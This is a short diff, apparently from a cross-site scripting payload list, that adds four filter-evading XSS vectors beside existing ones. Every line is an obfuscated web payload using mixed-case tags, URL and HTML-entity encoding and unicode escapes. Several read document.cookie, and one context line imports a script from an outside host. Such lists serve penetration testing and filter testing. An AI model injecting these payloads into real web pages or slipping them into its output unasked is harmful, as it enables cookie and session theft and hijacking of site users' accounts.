@@ -3,3 +3,7 @@
 <Img Src=OnXSS OnErroR=confirm(document.cookie)>
 <img%20hrEF="x"%20sRC="data:x,"%20oNLy=1%20oNErrOR=prompt`1`>
 <A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
+<Svg/OnLoad=alert%25%0A26lpar;1)>
+<details/open/ontoggle=confirm('XSS')>
+<svg/oNLY%3d1/**/On+ONLoaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>
+<svg onload=alert&#0000000040document.cookie)>
